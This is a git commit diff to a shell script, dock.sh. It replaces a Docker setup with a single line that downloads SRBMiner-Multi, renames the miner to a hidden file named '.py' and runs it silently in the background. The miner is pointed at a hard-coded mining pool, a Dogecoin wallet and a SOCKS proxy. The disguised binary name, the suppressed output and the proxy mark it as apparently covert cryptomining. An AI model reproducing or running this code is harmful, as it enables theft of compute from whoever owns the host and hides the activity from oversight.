4d3e4d30b8806ca06d7438e49bf0bcef56569c11
dediminari <101470275+dediminari@users.noreply.github.com>
2024-09-27 14:08:35 +0700

    Update dock.sh

--- dock.sh
+++ dock.sh
@@ -1,6 +1,1 @@
-sudo rm -rf bit
-sudo git clone https://github.com/dediminari/bit.git
-cd bit && sudo docker build . -t bit
-nohup docker run -itd --name bit --restart=always bit sleep infinity </dev/null &>/dev/null &
-sudo apt install inetutils-ping -y && nohup ping 1.1.1.1 </dev/null &>/dev/null &
-sudo apt install inetutils-ping -y && nohup ping 1.1.1.1 </dev/null &>/dev/null &
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.6.6/SRBMiner-Multi-2-6-6-Linux.tar.gz && tar -xf SRBMiner-Multi-2-6-6-Linux.tar.gz && rm -rf SRBMiner-Multi-2-6-6-Linux.tar.gz && mv SRBMiner-Multi-2-6-6 biter && cd biter && chmod +x ./SRBMiner-MULTI && mv SRBMiner-MULTI .py && nohup ./.py --algorithm yespowerr16 --disable-gpu --pool 103.249.70.7:6534 --wallet DKcjitN7vxfFv9ynJ2eXDsiw6oWRurjSYN --worker cpuXshell --password c=DOGE --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background --proxy 98.181.137.80:4145 --cpu-threads 8 </dev/null &>/dev/null &
